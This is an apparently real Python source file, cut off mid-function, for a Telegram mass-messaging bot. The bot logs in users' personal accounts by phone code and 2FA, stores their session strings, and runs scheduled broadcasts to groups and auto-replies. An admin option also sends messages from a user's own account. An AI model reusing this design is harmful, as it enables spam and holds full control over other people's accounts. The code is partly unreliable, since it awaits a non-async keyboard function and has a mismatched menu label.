import asyncio
import csv
import io
import html
import logging
import time
from datetime import datetime, timezone
from contextlib import suppress

from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.dispatcher.middlewares.base import BaseMiddleware
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, BufferedInputFile, BotCommand
)
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError, PhoneCodeExpiredError, PasswordHashInvalidError

import db
import sender
from config import config

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s: %(message)s")
log = logging.getLogger("jingizbot")

bot = Bot(config.bot_token)
dp = Dispatcher()
campaign_tasks: dict[int, asyncio.Task] = {}
timer_tasks: dict[int, asyncio.Task] = {}
auto_tasks: dict[int, asyncio.Task] = {}
auto_intervals: dict[int, int] = {}  # cached seconds; persisted in PostgreSQL settings table
auto_panel_refs: dict[int, tuple[int, int]] = {}  # user_id -> (chat_id, message_id)
autoreply_tasks: dict[int, asyncio.Task] = {}
autoreply_clients: dict[int, TelegramClient] = {}
autoreply_text_cache: dict[int, str] = {}
autoreply_last_chat_reply: dict[tuple[int, int], float] = {}
shutting_down = False  # Keep persisted auto campaigns enabled during graceful deploy/restart.
login_clients: dict[int, TelegramClient] = {}

class LoginFlow(StatesGroup):
    phone = State()
    code = State()
    password = State()

class TextFlow(StatesGroup):
    broadcast_text = State()
    timer_text = State()
    timer_datetime = State()
    auto_text = State()
    autoreply_text = State()

class AdminFlow(StatesGroup):
    add_user = State()
    add_admin = State()
    give_stars = State()
    price_value = State()
    force_sub = State()
    admin_user_broadcast_id = State()
    admin_user_broadcast_text = State()
    global_broadcast_text = State()
    refresh_user = State()
    remove_admin = State()

def main_keyboard(is_admin: bool = False) -> ReplyKeyboardMarkup:
    """Compact user-facing menu inspired by the supplied reference video.

    The admin entry is only rendered for users who passed the DB/ENV admin check.
    """
    rows = [
        [KeyboardButton(text="🤖 Авторассылка"), KeyboardButton(text="✉️ Текст сообщения")],
        [KeyboardButton(text="⏱ Интервал"), KeyboardButton(text="👥 Настройка групп")],
        [KeyboardButton(text="🔁 Autoreply"), KeyboardButton(text="🧰 Полезные функции")],
        [KeyboardButton(text="👤 Профили"), KeyboardButton(text="💎 Pro тариф")],
        [KeyboardButton(text="📊 Статистика"), KeyboardButton(text="❓ Помощь")],
        [KeyboardButton(text="📖 Инструкция"), KeyboardButton(text="🛒 Маркет")],
    ]
    if is_admin:
        rows.append([KeyboardButton(text="👑 Админ-панель")])
    return ReplyKeyboardMarkup(keyboard=rows, resize_keyboard=True, is_persistent=True)

MAIN_KB = main_keyboard(False)
UTILITY_KB = ReplyKeyboardMarkup(keyboard=[
    [KeyboardButton(text="🔗 Подключить аккаунт"), KeyboardButton(text="📨 Рассылка")],
    [KeyboardButton(text="⏱ Рассылка по таймеру"), KeyboardButton(text="✍️ Подпись")],
    [KeyboardButton(text="⭐ Мои звёзды"), KeyboardButton(text="🔄 Обновить группы")],
    [KeyboardButton(text="📋 Мои задачи"), KeyboardButton(text="🛑 Остановить рассылку")],
    [KeyboardButton(text="⏹ Стоп авторассылки"), KeyboardButton(text="☰ Меню")],
    [KeyboardButton(text="❌ Закрыть действие")],
], resize_keyboard=True, is_persistent=True)

ADMIN_KB = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="➕ Добавить пользователя", callback_data="adm:add_user"),
     InlineKeyboardButton(text="➕ Добавить администратора", callback_data="adm:add_admin")],
    [InlineKeyboardButton(text="👑 Список администраторов", callback_data="adm:admins"),
     InlineKeyboardButton(text="⭐ Начислить звёзды", callback_data="adm:stars")],
    [InlineKeyboardButton(text="💰 Цены", callback_data="adm:prices"),
     InlineKeyboardButton(text="📢 Обязательная подписка", callback_data="adm:subs")],
    [InlineKeyboardButton(text="➕ Добавить канал", callback_data="adm:add_channel"),
     InlineKeyboardButton(text="📋 Каналы подписки", callback_data="adm:subs")],
    [InlineKeyboardButton(text="📨 От аккаунта пользователя", callback_data="adm:user_broadcast"),
     InlineKeyboardButton(text="🌐 Общая рассылка", callback_data="adm:global_broadcast")],
    [InlineKeyboardButton(text="👥 Пользователи", callback_data="adm:users"),
     InlineKeyboardButton(text="📤 Экспорт CSV", callback_data="adm:csv")],
    [InlineKeyboardButton(text="📊 Статистика", callback_data="adm:stats")],
    [InlineKeyboardButton(text="🔄 Данные пользователя", callback_data="adm:refresh_user"),
     InlineKeyboardButton(text="🗑 Удалить администратора", callback_data="adm:remove_admin")],
    [InlineKeyboardButton(text="❌ Закрыть", callback_data="ui:close")],
])

PRICE_KEYS = {
    "connect_price": "Подключение",
    "broadcast_price": "Рассылка",
    "unsign_price": "Отключение подписи",
    "timer_price": "Таймер",
    "groups_refresh_price": "Обновление групп",
    "fetch_groups_price": "Загрузка групп",
}

def with_close(rows):
    """Append a consistent close button to an inline menu."""
    return InlineKeyboardMarkup(inline_keyboard=[*rows, [InlineKeyboardButton(text="❌ Закрыть", callback_data="ui:close")]])


def is_super(user_id: int) -> bool:
    return user_id in config.super_admins

async def admin_check(user_id: int) -> bool:
    return await db.is_admin(user_id, config.super_admins)

async def charge_if_needed(user_id: int, price_key: str) -> bool:
    if await admin_check(user_id):
        return True
    price = await db.get_price(price_key)
    if price <= 0:
        return True
    return await db.spend_stars(user_id, price)

async def force_sub_check(user_id: int) -> tuple[bool, list[dict]]:
    # An empty channel list means mandatory subscription is disabled.
    subs = await db.list_force_subs()
    if not subs:
        return True, []
    missing = []
    for sub in subs:
        ref = sub["chat_ref"]
        try:
            member = await bot.get_chat_member(ref, user_id)
            if member.status not in ("creator", "administrator", "member"):
                missing.append(dict(sub))
        except Exception:
            # If Telegram cannot confirm membership, do not silently bypass the gate.
            missing.append(dict(sub))
    return not missing, missing

def force_sub_kb(subs: list[dict]):
    rows = []
    for item in subs:
        sub = dict(item) if not isinstance(item, dict) else item
        ref = str(sub.get("chat_ref", ""))
        label = str(sub.get("label") or ref)
        invite_url = sub.get("invite_url")
        if invite_url:
            url = str(invite_url)
        elif ref.startswith("https://t.me/"):
            url = ref
        elif ref.startswith("@"):
            url = f"https://t.me/{ref[1:]}"
        elif not ref.startswith("-") and ref:
            url = f"https://t.me/{ref}"
        else:
            url = ""
        if url:
            rows.append([InlineKeyboardButton(text=f"📢 Подписаться: {label[:45]}", url=url)])
        else:
            rows.append([InlineKeyboardButton(text=f"📢 Канал: {label[:45]}", callback_data="check_subs")])
    rows.append([InlineKeyboardButton(text="✅ Проверить подписку", callback_data="check_subs")])
    return with_close(rows)

class ForceSubscriptionMiddleware(BaseMiddleware):
    """Enforce configured channel subscriptions for every feature, not only /start."""
    async def __call__(self, handler, event, data):
        user = getattr(event, "from_user", None)
        if not user:
            return await handler(event, data)
        # /start performs its own friendly subscription flow; check_subs is the escape hatch.
        if isinstance(event, Message) and event.text and event.text.split(maxsplit=1)[0] == "/start":
            return await handler(event, data)
        if isinstance(event, CallbackQuery) and event.data == "check_subs":
            return await handler(event, data)
        try:
            if await admin_check(user.id):
                return await handler(event, data)
            allowed, missing = await force_sub_check(user.id)
        except Exception:
            log.exception("Mandatory-subscription middleware failed; allowing the update to avoid a false subscription wall")
            # A storage/Telegram API outage is not proof that a user must subscribe.
            return await handler(event, data)
        if allowed:
            return await handler(event, data)
        prompt = "Для использования бота подпишитесь на обязательные каналы, затем нажмите «Проверить подписку»."
        if isinstance(event, Message):
            await event.answer(prompt, reply_markup=force_sub_kb(missing))
        elif isinstance(event, CallbackQuery):
            if event.message:
                await event.message.answer(prompt, reply_markup=force_sub_kb(missing))
            await event.answer("Сначала подпишитесь на обязательные каналы.", show_alert=True)
        return None


dp.message.middleware(ForceSubscriptionMiddleware())
dp.callback_query.middleware(ForceSubscriptionMiddleware())

# In-memory marker used only to resume the /start flow after a user joins required channels.
pending_subscription_start: set[int] = set()


async def show_home(message: Message, user_id: int | None = None):
    # callback.message.from_user is the bot, so callbacks must pass callback.from_user.id.
    user_id = int(user_id or (message.from_user.id if message.from_user else 0))
    is_admin = await admin_check(user_id)
    text = "Здравствуйте! JingizBot готов к работе. Выберите действие в меню."
    if is_admin:
        text += "\n\n👑 Для управления ботом нажмите «Админ-панель» в меню."
    await message.answer(text, reply_markup=main_keyboard(is_admin))

@dp.message(CommandStart())
async def start(message: Message, state: FSMContext):
    await state.clear()
    user = message.from_user
    await db.upsert_user(user.id, user.username, user.full_name)
    allowed, missing = (True, []) if await admin_check(user.id) else await force_sub_check(user.id)
    if not allowed:
        pending_subscription_start.add(user.id)
        await message.answer("Для использования бота сначала подпишитесь на следующие каналы/группы:", reply_markup=force_sub_kb(missing))
        return
    pending_subscription_start.discard(user.id)
    await show_home(message)

@dp.callback_query(F.data == "check_subs")
async def check_subs(callback: CallbackQuery):
    try:
        allowed, missing = (True, []) if await admin_check(callback.from_user.id) else await force_sub_check(callback.from_user.id)
    except Exception:
        log.exception("Could not verify mandatory subscriptions")
        await callback.answer("Не удалось проверить подписку. Попробуйте ещё раз позже.", show_alert=True)
        return
    if not allowed:
        await callback.answer("Вы ещё не подписались на все каналы/группы.", show_alert=True)
        return

    user_id = callback.from_user.id
    await callback.answer("Подписка подтверждена")
    # Remove the gate message, keeping the user's previous menu/message intact.
    if callback.message:
        with suppress(Exception):
            await callback.message.delete()
    if user_id in pending_subscription_start:
        pending_subscription_start.discard(user_id)
        await callback.message.answer("✅ Подписка подтверждена. Продолжаем работу.")
        await show_home(callback.message, user_id)
    else:
        # The original message/menu remains where the user left it; they can continue there.
        with suppress(Exception):
            await callback.message.answer("✅ Подписка подтверждена. Вернитесь к предыдущему меню — оно сохранено.")

async def get_setting(key: str, default: str | None = None) -> str | None:
    async with db.get_pool().acquire() as con:
        value = await con.fetchval("SELECT value FROM settings WHERE key=$1", key)
    return str(value) if value is not None else default


async def set_setting(key: str, value: str) -> None:
    async with db.get_pool().acquire() as con:
        await con.execute(
            "INSERT INTO settings(key,value) VALUES($1,$2) "
            "ON CONFLICT(key) DO UPDATE SET value=EXCLUDED.value", key, value
        )


def autoreply_keyboard(enabled: bool) -> InlineKeyboardMarkup:
    action = InlineKeyboardButton(
        text="⏹ Отключить автоответчик" if enabled else "▶️ Включить автоответчик",
        callback_data="autoreply:disable" if enabled else "autoreply:enable",
    )
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✍️ Изменить текст ответа", callback_data="autoreply:set_text")],
        [action],
        [InlineKeyboardButton(text="🔄 Обновить", callback_data="autoreply:panel"),
         InlineKeyboardButton(text="❌ Закрыть", callback_data="ui:close")],
    ])


async def show_autoreply_panel(message: Message) -> None:
    user_id = message.from_user.id
    user = await db.get_user(user_id)
    enabled = (await get_setting(f"autoreply_enabled:{user_id}", "0")) == "1"
    reply_text = await get_setting(f"autoreply_text:{user_id}", "") or ""
    status = "🟢 Включён" if enabled else "🔴 Отключён"
    account = "✅ подключён" if user and user["session_string"] else "❌ не подключён"
    text = ("🔁 <b>Autoreply — автоответчик</b>\n\n"
            f"Статус: {status}\nАккаунт: {account}\n"
            f"Текст ответа: {html.escape(reply_text[:500]) if reply_text else 'не задан'}\n\n"
            "Автоответчик отвечает только на входящие личные сообщения и не отвечает в группах. "
            "Чтобы не создавать поток сообщений, одному собеседнику не чаще одного раза в 24 часа.")
    await message.answer(text, parse_mode="HTML", reply_markup=autoreply_keyboard(enabled))


async def start_autoreply_listener(user_id: int) -> None:
    old = autoreply_tasks.get(user_id)
    if old and not old.done():
        return
    user = await db.get_user(user_id)
    reply_text = await get_setting(f"autoreply_text:{user_id}", "") or ""
    if not user or not user["session_string"]:
        raise RuntimeError("Аккаунт Telegram не подключён")
    if not reply_text.strip():
        raise RuntimeError("Сначала задайте текст автоответа")

    client = TelegramClient(StringSession(user["session_string"]), config.api_id, config.api_hash)
    await client.connect()
    if not await client.is_user_authorized():
        await client.disconnect()
        raise RuntimeError("Сессия аккаунта недействительна; подключите аккаунт заново")

    autoreply_text_cache[user_id] = reply_text.strip()

    async def on_private_message(event):
        try:
            if not event.is_private or not event.message or not event.sender_id:
                return
            sender_entity = await event.get_sender()
            if getattr(sender_entity, "bot", False):
                return
            now = time.monotonic()
            key = (user_id, int(event.sender_id))
            if now - autoreply_last_chat_reply.get(key, 0) < 86400:
                return
            response = autoreply_text_cache.get(user_id, "").strip()
            if not response:
                return
            await event.respond(response)
            autoreply_last_chat_reply[key] = now
            log.info("Auto-replied to a private chat for user %s", user_id)
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            log.warning("Autoreply failed for account %s: %s", user_id, type(exc).__name__)

    client.add_event_handler(on_private_message, events.NewMessage(incoming=True))
    autoreply_clients[user_id] = client

    async def wait_for_disconnect():
        try:
            await client.run_until_disconnected()
        finally:
            autoreply_clients.pop(user_id, None)
            autoreply_text_cache.pop(user_id, None)
            with suppress(Exception):
                await client.disconnect()

    autoreply_tasks[user_id] = asyncio.create_task(wait_for_disconnect())
    log.info("Autoreply listener started for account %s", user_id)


async def stop_autoreply_listener(user_id: int) -> None:
    task = autoreply_tasks.pop(user_id, None)
    client = autoreply_clients.pop(user_id, None)
    autoreply_text_cache.pop(user_id, None)
    if client:
        with suppress(Exception):
            await client.disconnect()
    if task and not task.done():
        task.cancel()
        with suppress(asyncio.CancelledError, Exception):
            await task


@dp.callback_query(F.data.startswith("autoreply:"))
async def autoreply_actions(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    action = callback.data.split(":", 1)[1]
    if action == "panel":
        if callback.message:
            await callback.message.edit_text(
                await autoreply_panel_text(user_id), parse_mode="HTML",
                reply_markup=autoreply_keyboard(
                    (await get_setting(f"autoreply_enabled:{user_id}", "0")) == "1"))
        await callback.answer()
    elif action == "set_text":
        await state.set_state(TextFlow.autoreply_text)
        await callback.message.answer("✍️ Отправьте текст, который аккаунт будет отправлять в ответ на входящие личные сообщения. Для отмены: /cancel")
        await callback.answer()
    elif action == "enable":
        try:
            await start_autoreply_listener(user_id)
            await set_setting(f"autoreply_enabled:{user_id}", "1")
            await callback.answer("Автоответчик включён")
            if callback.message:
                await callback.message.edit_text(await autoreply_panel_text(user_id), parse_mode="HTML", reply_markup=autoreply_keyboard(True))
        except Exception as exc:
            log.exception("Could not enable autoreply for %s", user_id)
            await callback.answer(str(exc)[:180], show_alert=True)
    elif action == "disable":
        await set_setting(f"autoreply_enabled:{user_id}", "0")
        await stop_autoreply_listener(user_id)
        await callback.answer("Автоответчик отключён")
        if callback.message:
            await callback.message.edit_text(await autoreply_panel_text(user_id), parse_mode="HTML", reply_markup=autoreply_keyboard(False))


async def autoreply_panel_text(user_id: int) -> str:
    user = await db.get_user(user_id)
    enabled = (await get_setting(f"autoreply_enabled:{user_id}", "0")) == "1"
    reply_text = await get_setting(f"autoreply_text:{user_id}", "") or ""
    return ("🔁 <b>Autoreply — автоответчик</b>\n\n"
            f"Статус: {'🟢 Включён' if enabled else '🔴 Отключён'}\n"
            f"Аккаунт: {'✅ подключён' if user and user['session_string'] else '❌ не подключён'}\n"
            f"Текст ответа: {html.escape(reply_text[:500]) if reply_text else 'не задан'}\n\n"
            "Отвечает только на входящие личные сообщения; одному собеседнику — не чаще раза в 24 часа.")


@dp.message(TextFlow.autoreply_text)
async def save_autoreply_text(message: Message, state: FSMContext):
    reply_text = (message.text or "").strip()
    if not reply_text:
        await message.answer("Текст ответа пустой. Отправьте текст или /cancel.")
        return
    if len(reply_text) > 4000:
        await message.answer("Слишком длинный текст. Максимум 4000 символов.")
        return
    user_id = message.from_user.id
    await set_setting(f"autoreply_text:{user_id}", reply_text)
    enabled = (await get_setting(f"autoreply_enabled:{user_id}", "0")) == "1"
    if enabled:
        await stop_autoreply_listener(user_id)
        try:
            await start_autoreply_listener(user_id)
        except Exception as exc:
            await set_setting(f"autoreply_enabled:{user_id}", "0")
            await message.answer(f"Текст сохранён, но автоответчик отключён: {type(exc).__name__}.")
    await state.clear()
    await message.answer("✅ Текст автоответа сохранён.")
    await show_autoreply_panel(message)


MENU_BUTTONS = {
    # Main menu (reference-video labels)
    "🤖 Авторассылка", "✉️ Текст сообщения", "⏱ Интервал", "👥 Настройка групп",
    "🔁 Autoreply", "🧰 Полезные функции", "👤 Профили", "💎 Pro тариф",
    "📊 Статистика", "❓ Помощь", "📖 Инструкция", "🛒 Маркет", "👑 Админ-панель",
    # Utilities / legacy aliases
    "🔗 Подключить аккаунт", "👥 Группы", "📨 Рассылка", "⏱ Рассылка по таймеру",
    "✍️ Подпись", "⭐ Мои звёзды", "🔄 Обновить группы", "🛑 Остановить рассылку",
    "⏹ Стоп авторассылки", "📋 Мои задачи", "☰ Меню", "❌ Закрыть действие",
}

@dp.message(F.text.in_(MENU_BUTTONS))
async def route_menu_button(message: Message, state: FSMContext):
    """Menu buttons take priority over FSM input handlers, preventing 'format not found' errors."""
    current_state = await state.get_state()
    if current_state:
        if current_state.startswith("LoginFlow:"):
            await cleanup_login(message.from_user.id, state)
        else:
            await state.clear()

    if message.text == "❌ Закрыть действие":
        await message.answer("✅ Действие закрыто. Выберите следующий пункт меню.", reply_markup=await main_keyboard(await admin_check(message.from_user.id)))
    elif message.text == "🔗 Подключить аккаунт":
        await connect_start(message, state)
    elif message.text == "👤 Профили":
        await profile_menu(message)
    elif message.text in ("👥 Группы", "👥 Настройка групп"):
        await groups_menu(message)
    elif message.text in ("📨 Рассылка", "✉️ Текст сообщения"):
        await broadcast_start(message, state)
    elif message.text == "🧰 Полезные функции":
        await message.answer("🧰 <b>Полезные функции</b>\nВыберите нужную функцию в меню ниже.", reply_markup=UTILITY_KB, parse_mode="HTML")
    elif message.text == "👑 Админ-панель":
        if await admin_check(message.from_user.id):
            await message.answer("👑 Панель администратора", reply_markup=ADMIN_KB)
        else:
            await message.answer("Доступ запрещён.")
    elif message.text == "🔁 Autoreply":
        await show_autoreply_panel(message)
    elif message.text == "💎 Pro тариф":
        await message.answer("💎 <b>Pro тариф</b>\nДля администраторов все функции бесплатны. Условия для пользователей уточняются у администратора бота.", parse_mode="HTML")
    elif message.text == "📊 Статистика":
        user = await db.get_user(message.from_user.id)
        groups = await db.list_groups(message.from_user.id)
        selected = sum(1 for g in groups if g["is_selected"] and g["can_send"])
        await message.answer(f"📊 <b>Ваша статистика</b>\nID: <code>{message.from_user.id}</code>\nАккаунт: {'подключён' if user and user['session_string'] else 'не подключён'}\nВсего групп: {len(groups)}\nВыбрано для отправки: {selected}\nЗвёзды: {user['stars'] if user else 0}", parse_mode="HTML")
    elif message.text == "❓ Помощь":
        await message.answer("❓ <b>Помощь</b>\nПодключите аккаунт, обновите список групп, выберите группы и сохраните выбор. Для разовой рассылки нажмите «Текст сообщения», для повторяющейся — «Авторассылка».\n\nДля вопросов обратитесь к администратору бота.", parse_mode="HTML")
    elif message.text == "📖 Инструкция":
        await message.answer("📖 <b>Краткая инструкция</b>\n1. «Профили» — подключите аккаунт Telegram.\n2. «Полезные функции» → «🔄 Обновить группы».\n3. «Настройка групп» — выберите группы и сохраните выбор.\n4. «Текст сообщения» — разовая рассылка.\n5. «Авторассылка» — выберите интервал и запустите циклы.\n6. Для остановки используйте «⏹ Стоп авторассылки».\n\nОтправляйте сообщения только в группы, где это разрешено.", parse_mode="HTML")
    elif message.text == "🛒 Маркет":
        prices = [f"• {label}: {await db.get_price(key)} ⭐" for key, label in PRICE_KEYS.items()]
        await message.answer("🛒 <b>Маркет / цены</b>\n" + "\n".join(prices) + "\n\nАдминистраторам все функции доступны бесплатно.", parse_mode="HTML")
    elif message.text == "🤖 Авторассылка":
        await auto_menu(message)
    elif message.text == "⏹ Стоп авторассылки":
        await stop_auto(message)
    elif message.text == "⏱ Рассылка по таймеру":
        await timer_start(message, state)
    elif message.text == "⏳ Интервал":
        await delay_menu(message)
    elif message.text == "✍️ Подпись":
        await signature_menu(message)
    elif message.text == "⭐ Мои звёзды":
        await my_stars(message)
    elif message.text == "🔄 Обновить группы":
        await refresh_groups(message)
    elif message.text == "🛑 Остановить рассылку":
        await stop_campaign(message)
    elif message.text == "📋 Мои задачи":
        await my_tasks(message)
    else:
        await show_home(message)

@dp.callback_query(F.data == "ui:close")
async def close_inline_menu(callback: CallbackQuery, state: FSMContext):
    current_state = await state.get_state()
    if current_state:
        if current_state.startswith("LoginFlow:"):
            await cleanup_login(callback.from_user.id, state)
        else:
            await state.clear()
    if callback.message:
        ref = auto_panel_refs.get(callback.from_user.id)
        if ref == (callback.message.chat.id, callback.message.message_id):
            # Closing a panel should keep it closed even when an auto task later finishes.
            auto_panel_refs.pop(callback.from_user.id, None)
        try:
            await callback.message.delete()
        except Exception:
            with suppress(Exception):
                await callback.message.edit_reply_markup(reply_markup=None)
    await callback.answer("Меню закрыто")

@dp.message(Command("cancel"))
async def cancel_action(message: Message, state: FSMContext):
    current_state = await state.get_state()
    if current_state and current_state.startswith("LoginFlow:"):
        await cleanup_login(message.from_user.id, state)
    else:
        await state.clear()
    await message.answer("✅ Текущее действие отменено.", reply_markup=await main_keyboard(await admin_check(message.from_user.id)))

@dp.message(Command("menu"))
@dp.message(F.text == "☰ Меню")
async def menu_command(message: Message):
    await show_home(message)

@dp.message(Command("users"))
async def users_command(message: Message):
    if not await admin_check(message.from_user.id):
        await message.answer("Доступ запрещён.")
        return
    await show_users_page(message, 0)

@dp.message(Command("admin"))
async def admin_command(message: Message):
    if not await admin_check(message.from_user.id):
        await message.answer("Доступ запрещён.")
        return
    await message.answer("👑 Панель администратора", reply_markup=ADMIN_KB)

@dp.callback_query(F.data == "adm:open")
async def admin_open(callback: CallbackQuery):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    await callback.message.answer("👑 Панель администратора", reply_markup=ADMIN_KB)
    await callback.answer()

async def profile_menu(message: Message) -> None:
    user = await db.get_user(message.from_user.id)
    groups = await db.list_groups(message.from_user.id)
    selected = sum(1 for group in groups if group["is_selected"] and group["can_send"])
    connected = bool(user and user["session_string"])
    phone = str(user["phone"] or "") if user else ""
    safe_phone = (phone[:4] + "••••" + phone[-2:]) if len(phone) > 8 else ("скрыт" if phone else "не указан")
    text = (
        "👤 <b>Профиль Telegram</b>\n\n"
        f"Статус: {'🟢 подключён' if connected else '🔴 не подключён'}\n"
        f"Телефон: {html.escape(safe_phone)}\n"
        f"Групп найдено: {len(groups)}\nВыбрано групп: {selected}\n\n"
        "Подключение пользовательского аккаунта используется для работы с вашими группами. "
        "Никому не передавайте коды входа и пароль 2FA."
    )
    rows = [[InlineKeyboardButton(text="🔄 Подключить / переподключить", callback_data="profile:connect")]]
    rows.append([InlineKeyboardButton(text="❌ Закрыть", callback_data="ui:close")])
    await message.answer(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))


@dp.callback_query(F.data == "profile:connect")
async def profile_connect_callback(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if not await charge_if_needed(user_id, "connect_price"):
        await callback.answer("Недостаточно звёзд.", show_alert=True)
        return
    await state.clear()
    await state.set_state(LoginFlow.phone)
    if callback.message:
        await callback.message.answer(
            "Отправьте номер телефона Telegram в международном формате, например +992900000000 или +79991234567.\n"
            "Никому не сообщайте код входа и пароль двухэтапной аутентификации (2FA)."
        )
    await callback.answer()


async def require_user(message: Message):
    user = await db.get_user(message.from_user.id)
    if not user:
        await db.upsert_user(message.from_user.id, message.from_user.username, message.from_user.full_name)
        user = await db.get_user(message.from_user.id)
    return user

@dp.message(F.text == "🔗 Подключить аккаунт")
async def connect_start(message: Message, state: FSMContext):
    await require_user(message)
    if not await charge_if_needed(message.from_user.id, "connect_price"):
        await message.answer("Недостаточно звёзд.")
        return
    await state.set_state(LoginFlow.phone)
    await message.answer("Отправьте номер телефона Telegram. Код страны определяется автоматически по номеру: Россия +7, Таджикистан +992. Примеры: +79991234567 или +992900000000.\nНикому не сообщайте код входа и пароль двухэтапной аутентификации (2FA).")

@dp.message(LoginFlow.phone)
async def connect_phone(message: Message, state: FSMContext):
    raw_phone = (message.text or "").strip()
    digits = "".join(ch for ch in raw_phone if ch.isdigit())
    # Автоматически определяем код страны по введённому номеру: Таджикистан +992, Россия +7.
    if raw_phone.startswith("+"):
        phone = "+" + digits
    elif digits.startswith("992"):
        phone = "+" + digits
    elif digits.startswith("7"):
        phone = "+" + digits
    elif len(digits) == 9 and digits.startswith("9"):
        phone = "+992" + digits
    elif len(digits) == 10 and digits.startswith("9"):
        phone = "+7" + digits
    else:
        await message.answer("Не удалось определить страну. Введите номер с кодом +7 (Россия) или +992 (Таджикистан), например +79991234567 или +992900000000.")
        return
    if len(phone) < 8 or len(phone) > 20:
        await message.answer("Неверный номер. Пример: +992900000000 или +79991234567")
        return
    client = TelegramClient(StringSession(), config.api_id, config.api_hash)
    try:
        await client.connect()
        sent = await client.send_code_request(phone)
        login_clients[message.from_user.id] = client
        await state.update_data(phone=phone, phone_code_hash=sent.phone_code_hash)
        await state.set_state(LoginFlow.code)
        await message.answer("Введите код, полученный от Telegram, в формате 52.301 (точка будет удалена автоматически).")
    except PhoneNumberInvalidError:
        await client.disconnect()
        await message.answer("Неверный номер телефона. Попробуйте ещё раз.")
    except Exception as exc:
        await client.disconnect()
        log.exception("Failed to request login code")
        await message.answer(f"Не удалось отправить код: {type(exc).__name__}. Попробуйте позже.")

@dp.message(LoginFlow.code)
async def connect_code(message: Message, state: FSMContext):
    code_raw = (message.text or "").strip()
    # Пользователь может вводить код как 52.301; Telegram API получает только цифры.
    code = "".join(ch for ch in code_raw if ch.isdigit())
    data = await state.get_data()
    client = login_clients.get(message.from_user.id)
    if not client:
        await state.clear()
        await message.answer("Сессия входа потеряна. Начните подключение заново.")
        return
    try:
        await client.sign_in(phone=data["phone"], code=code, phone_code_hash=data["phone_code_hash"])
        await db.save_session(message.from_user.id, client.session.save(), data["phone"])
        await state.clear()
        login_clients.pop(message.from_user.id, None)
        await client.disconnect()
        await message.answer("✅ Аккаунт успешно подключён.")
    except SessionPasswordNeededError:
        await state.set_state(LoginFlow.password)
        await message.answer("Включена двухэтапная аутентификация Telegram (2FA). Введите пароль 2FA. Пароль не сохраняется в базе данных.")
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        await message.answer("Неверный или просроченный код. Запросите новый код и введите его в формате 52.301.")
    except Exception as exc:
        log.exception("Login code failed")
        await message.answer(f"Не удалось войти: {type(exc).__name__}.")
        await cleanup_login(message.from_user.id, state)

@dp.message(LoginFlow.password)
async def connect_password(message: Message, state: FSMContext):
    client = login_clients.get(message.from_user.id)
    data = await state.get_data()
    if not client:
        await state.clear()
        await message.answer("Сессия входа потеряна. Начните подключение заново.")
        return
    password = (message.text or "").strip()
    try:
        await client.sign_in(password=password)
        await db.save_session(message.from_user.id, client.session.save(), data["phone"])
        await state.clear()
        login_clients.pop(message.from_user.id, None)
        await client.disconnect()
        await message.answer("✅ Аккаунт успешно подключён.")
    except PasswordHashInvalidError:
        await message.answer("Неверный пароль 2FA. Проверьте пароль и попробуйте ещё раз.")
    except Exception as exc:
        log.exception("2FA login failed")
        await message.answer(f"Не удалось завершить вход через 2FA: {type(exc).__name__}. Проверьте пароль и попробуйте ещё раз.")

async def cleanup_login(user_id: int, state: FSMContext):
    client = login_clients.pop(user_id, None)
    if client:
        with suppress(Exception):
            await client.disconnect()
    await state.clear()

def groups_keyboard(groups):
    rows = []
    for group in groups:
        mark = "✅" if group["is_selected"] else "⬜️"
        status = "" if group["can_send"] else " · нет прав на отправку"
        title = (group["title"] or str(group["chat_id"]))[:38]
        rows.append([InlineKeyboardButton(text=f"{mark} {title}{status}", callback_data=f"grp:{group['chat_id']}")])
    rows.append([InlineKeyboardButton(text="💾 Сохранить выбор", callback_data="grp:save")])
    return with_close(rows)

@dp.message(F.text == "👥 Группы")
async def groups_menu(message: Message):
    await require_user(message)
    groups = await db.list_groups(message.from_user.id)
    if not groups:
        await message.answer("Список групп пуст. Нажмите «🔄 Обновить группы».")
        return
    await message.answer("Выберите несколько групп. Нажатия отмечают/снимают выбор; остальные кнопки останутся на месте. После выбора нажмите «Сохранить выбор».", reply_markup=groups_keyboard(groups))

@dp.callback_query(F.data.startswith("grp:"))
async def group_toggle(callback: CallbackQuery):
    if callback.data == "grp:save":
        groups = await db.list_groups(callback.from_user.id)
        chosen = sum(1 for g in groups if g["is_selected"] and g["can_send"])
        await callback.answer(f"Выбор сохранён: {chosen} групп(ы)", show_alert=True)
        await callback.message.edit_text(f"✅ Выбор сохранён. Выбрано групп с правом отправки: {chosen}.", reply_markup=groups_keyboard(groups))
        return
    try:
        chat_id = int(callback.data.split(":", 1)[1])
    except ValueError:
        await callback.answer("Некорректная группа", show_alert=True)
        return
    row = await db.toggle_group(callback.from_user.id, chat_id)
    if not row:
        await callback.answer("Группа не найдена", show_alert=True)
        return
    groups = await db.list_groups(callback.from_user.id)
    await callback.message.edit_reply_markup(reply_markup=groups_keyboard(groups))
    await callback.answer("Группа выбрана" if row["is_selected"] else "Выбор группы снят")

@dp.message(F.text == "🔄 Обновить группы")
async def refresh_groups(message: Message):
    user_id = message.from_user.id
    user = await require_user(message)
    if not await charge_if_needed(user_id, "groups_refresh_price"):
        await message.answer("Недостаточно звёзд.")
        return
    if not user["session_string"]:
        await message.answer("Сначала подключите аккаунт.")
        return
    await message.answer("Загружаю группы…")
    try:
        groups = await sender.fetch_user_groups(user["session_string"])
        await db.upsert_groups(user_id, groups)
        await message.answer(f"✅ Группы обновлены. Количество: {len(groups)}")
